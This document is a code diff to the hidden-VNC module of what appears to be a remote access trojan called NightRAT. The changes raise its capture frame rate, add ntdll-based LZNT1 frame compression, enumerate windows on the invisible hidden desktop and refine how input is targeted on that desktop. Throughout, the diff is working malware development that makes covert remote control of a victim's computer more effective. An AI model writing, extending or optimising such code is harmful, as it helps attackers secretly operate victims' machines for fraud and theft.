@@ -69,6 +69,8 @@ static const uint16_t PACKET_SIGNATURE = 0x524E;
 static const uint8_t PACKET_TYPE_HVNC_FRAME = 0x06;
 static const uint32_t FRAME_FORMAT_JPEG = 1;
 static const uint32_t FRAME_FORMAT_JPEG_DIRTY = 2;
+static const uint32_t FRAME_FORMAT_JPEG_COMPRESSED = 3;
+static const uint32_t FRAME_FORMAT_JPEG_DIRTY_COMPRESSED = 4;
 
 static atomic_bool g_captureRunning(false);
 static thread g_captureThread;
@@ -76,7 +78,7 @@ static mutex g_captureMutex;
 static mutex g_sendMutex;
 static SOCKET g_socket = INVALID_SOCKET;
 static int g_scalePercent = 50;
-static int g_targetFps = 10;
+static int g_targetFps = 15;
 
 static HDESK g_hHiddenDesktop = NULL;
 static wstring g_desktopName = L"NightRAT_HiddenDesktop";
@@ -436,19 +438,33 @@ static bool find_dirty_rect(const vector<uint32_t>& current, vector<uint32_t>& p
         return true;
     }
 
+    if (memcmp(current.data(), previous.data(), current.size() * sizeof(uint32_t)) == 0) {
+        return false;
+    }
+
     int left = width;
     int top = height;
     int right = -1;
     int bottom = -1;
 
+    const uint32_t* pCurr = current.data();
+    const uint32_t* pPrev = previous.data();
+
     for (int y = 0; y < height; ++y) {
-        const size_t row = (size_t)y * (size_t)width;
+        const uint32_t* rowCurr = pCurr + (size_t)y * width;
+        const uint32_t* rowPrev = pPrev + (size_t)y * width;
+
+        if (memcmp(rowCurr, rowPrev, width * sizeof(uint32_t)) == 0) {
+            continue;
+        }
+
+        if (y < top) top = y;
+        if (y > bottom) bottom = y;
+
         for (int x = 0; x < width; ++x) {
-            if (current[row + x] != previous[row + x]) {
+            if (rowCurr[x] != rowPrev[x]) {
                 if (x < left) left = x;
-                if (y < top) top = y;
                 if (x > right) right = x;
-                if (y > bottom) bottom = y;
             }
         }
     }
@@ -493,6 +509,62 @@ static bool copy_bitmap_region(HBITMAP hSource, int x, int y, int width, int hei
     SelectObject(hdcSource, hOldSource);
     hOldSource = NULL;
     return true;
+}
+
+typedef NTSTATUS (NTAPI *pfnRtlGetCompressionWorkSpaceSize)(
+    USHORT CompressionFormatAndEngine,
+    PULONG CompressBufferWorkSpaceSize,
+    PULONG CompressFragmentWorkSpaceSize
+);
+
+typedef NTSTATUS (NTAPI *pfnRtlCompressBuffer)(
+    USHORT CompressionFormatAndEngine,
+    PUCHAR SourceBuffer,
+    ULONG SourceBufferLength,
+    PUCHAR DestinationBuffer,
+    ULONG DestinationBufferLength,
+    ULONG ChunkSize,
+    PULONG UncompressedChunkSize,
+    PVOID WorkSpace
+);
+
+static bool compress_buffer(const std::vector<unsigned char>& input, std::vector<unsigned char>& output) {
+    HMODULE hNtDll = GetModuleHandleA("ntdll.dll");
+    if (!hNtDll) return false;
+
+    auto RtlGetCompressionWorkSpaceSize = (pfnRtlGetCompressionWorkSpaceSize)GetProcAddress(hNtDll, "RtlGetCompressionWorkSpaceSize");
+    auto RtlCompressBuffer = (pfnRtlCompressBuffer)GetProcAddress(hNtDll, "RtlCompressBuffer");
+
+    if (!RtlGetCompressionWorkSpaceSize || !RtlCompressBuffer) return false;
+
+    USHORT format = 2; // COMPRESSION_FORMAT_LZNT1
+    ULONG workSpaceSize = 0, fragmentSize = 0;
+    if (RtlGetCompressionWorkSpaceSize(format, &workSpaceSize, &fragmentSize) != 0) return false;
+
+    std::vector<unsigned char> workSpace(workSpaceSize);
+    ULONG maxCompressedSize = (ULONG)input.size() + (ULONG)(input.size() / 10) + 1024;
+    std::vector<unsigned char> tempCompressed(maxCompressedSize);
+
+    ULONG compressedSize = 0;
+    NTSTATUS status = RtlCompressBuffer(
+        format,
+        (PUCHAR)input.data(),
+        (ULONG)input.size(),
+        (PUCHAR)tempCompressed.data(),
+        maxCompressedSize,
+        4096,
+        &compressedSize,
+        workSpace.data()
+    );
+
+    if (status == 0) { // STATUS_SUCCESS
+        output.resize(4 + compressedSize);
+        uint32_t originalSize = (uint32_t)input.size();
+        std::memcpy(output.data(), &originalSize, 4);
+        std::memcpy(output.data() + 4, tempCompressed.data(), compressedSize);
+        return true;
+    }
+    return false;
 }
 
 // -----------------------------------------------------------------------
@@ -587,13 +659,26 @@ static void encode_worker() {
         }
 
         if (encoded) {
+            std::vector<unsigned char> compressed;
+            uint32_t finalFormat = format;
+            if (compress_buffer(jpeg, compressed)) {
+                if (compressed.size() < jpeg.size()) {
+                    jpeg = std::move(compressed);
+                    if (format == FRAME_FORMAT_JPEG) {
+                        finalFormat = FRAME_FORMAT_JPEG_COMPRESSED;
+                    } else if (format == FRAME_FORMAT_JPEG_DIRTY) {
+                        finalFormat = FRAME_FORMAT_JPEG_DIRTY_COMPRESSED;
+                    }
+                }
+            }
+
             lock_guard<mutex> lock(g_frameMutex);
             while (g_sendQueue.size() >= MAX_SEND_QUEUE) {
                 g_sendQueue.pop_front();
             }
             g_sendQueue.push_back({std::move(jpeg), data.width, data.height, data.scale, data.fps,
                                    dirty.left, dirty.top, dirty.right - dirty.left, dirty.bottom - dirty.top,
-                                   format});
+                                   finalFormat});
             g_sendCV.notify_one();
         }
     }
@@ -702,8 +787,7 @@ static void capture_loop() {
         }
 
         // Fill background
-        RECT fullRect = { 0, 0, sw, sh };
-        FillRect(hdcMem, &fullRect, (HBRUSH)GetStockObject(BLACK_BRUSH));
+        PatBlt(hdcMem, 0, 0, sw, sh, BLACKNESS);
 
         DWORD now = GetTickCount();
         DWORD fullFrameInterval = staticFrames > 30 ? 7000 : 3000;
@@ -711,11 +795,17 @@ static void capture_loop() {
         DWORD enumInterval = staticFrames > 30 ? 1000 : 350;
         if (windows.empty() || forceFullFrame || now - lastWindowEnum >= enumInterval) {
             windows.clear();
-            HWND hwnd = GetWindow(GetDesktopWindow(), GW_CHILD);
-            while (hwnd) {
-                if (IsWindowVisible(hwnd) && !IsIconic(hwnd)) windows.push_back(hwnd);
-                hwnd = GetWindow(hwnd, GW_HWNDNEXT);
-            }
+            struct EnumParam {
+                vector<HWND>* list;
+            } param = { &windows };
+            auto EnumCallback = [](HWND hwnd, LPARAM lParam) -> BOOL {
+                auto p = reinterpret_cast<EnumParam*>(lParam);
+                if (IsWindowVisible(hwnd) && !IsIconic(hwnd)) {
+                    p->list->push_back(hwnd);
+                }
+                return TRUE;
+            };
+            EnumDesktopWindows(g_hHiddenDesktop, EnumCallback, reinterpret_cast<LPARAM>(&param));
             reverse(windows.begin(), windows.end());
             lastWindowEnum = now;
         }
@@ -745,7 +835,11 @@ static void capture_loop() {
             }
 
             PatBlt(hdcWin, 0, 0, ww, wh, BLACKNESS);
-            if (!PrintWindow(h, hdcWin, printFlags)) {
+            bool printSuccess = PrintWindow(h, hdcWin, printFlags);
+            if (!printSuccess) {
+                printSuccess = PrintWindow(h, hdcWin, 0);
+            }
+            if (!printSuccess) {
                 HDC hdcRealWin = GetWindowDC(h);
                 if (hdcRealWin) {
                     BitBlt(hdcWin, 0, 0, ww, wh, hdcRealWin, 0, 0, SRCCOPY);
@@ -997,10 +1091,37 @@ static void activate_target_window(HWND hwnd, UINT msg, LRESULT ht) {
 }
 
 // -----------------------------------------------------------------------
+//  Topmost desktop window helpers
+// -----------------------------------------------------------------------
+static BOOL CALLBACK TopmostEnumProc(HWND hwnd, LPARAM lParam) {
+    HWND* pResult = reinterpret_cast<HWND*>(lParam);
+    if (IsWindowVisible(hwnd) && !IsIconic(hwnd)) {
+        wchar_t className[256];
+        if (GetClassNameW(hwnd, className, 256)) {
+            // Skip the standard desktop manager and taskbar windows
+            if (wcscmp(className, L"Progman") != 0 &&
+                wcscmp(className, L"Shell_TrayWnd") != 0 &&
+                wcscmp(className, L"Button") != 0) {
+                *pResult = hwnd;
+                return FALSE; // Stop enumerating, found topmost
+            }
+        }
+    }
+    return TRUE;
+}
+
+static HWND GetTopmostDesktopWindow() {
+    HWND topmost = NULL;
+    EnumDesktopWindows(g_hHiddenDesktop, TopmostEnumProc, reinterpret_cast<LPARAM>(&topmost));
+    return topmost;
+}
+
+// -----------------------------------------------------------------------
 //  Yardımcı: Odaklanmış pencereyi bul (gizli desktop'ta)
 // -----------------------------------------------------------------------
 static HWND GetFocusedWindow() {
     HWND hTarget = g_hCurrentFocus;
+    if (!hTarget || !IsWindow(hTarget)) hTarget = GetTopmostDesktopWindow(); // Fallback to topmost window of hidden desktop
     if (!hTarget || !IsWindow(hTarget)) hTarget = GetForegroundWindow();
     if (!hTarget || !IsWindow(hTarget)) hTarget = g_hLastWindow;
     if (!hTarget || !IsWindow(hTarget)) return NULL;
